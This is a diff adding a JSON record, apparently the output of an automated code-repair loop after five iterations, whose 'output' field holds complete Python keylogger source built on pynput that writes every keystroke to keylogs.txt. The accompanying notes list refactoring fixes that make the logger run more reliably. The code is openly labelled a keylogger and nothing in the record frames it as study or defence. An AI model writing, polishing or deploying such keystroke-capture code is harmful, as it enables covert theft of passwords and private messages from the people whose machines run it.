@@ -1,0 +1,10 @@
+{
+  "output": "from pynput.keyboard import Listener, Key\n\ndef on_press(key, f):\n    try:\n        if hasattr(key, 'char'):\n            f.write(key.char)\n        elif key == Key.enter:\n            f.write('[ENTER]')\n        elif key == Key.space:\n            f.write('[SPACE]')\n        elif key == Key.esc:\n            return False\n    except Exception as e:\n        print(f'Error writing to file: {e}')\n\ndef main():\n    try:\n        with open('keylogs.txt', 'a') as f:\n            with Listener(on_press=lambda key: on_press(key, f)) as listener:\n                listener.join()\n    except Exception as e:\n        print(f'Error in keylogger setup: {e}')\n\nif __name__ == '__main__':\n    main()",
+  "notes": "Removed global variable 'f', Moved exception handling inside on_press, and ensured file is properly handled within the 'with' block.",
+  "applied_fixes": [
+    "iteration4_issue1",
+    "iteration4_issue2",
+    "iteration4_issue3"
+  ],
+  "iterations": 5
+}
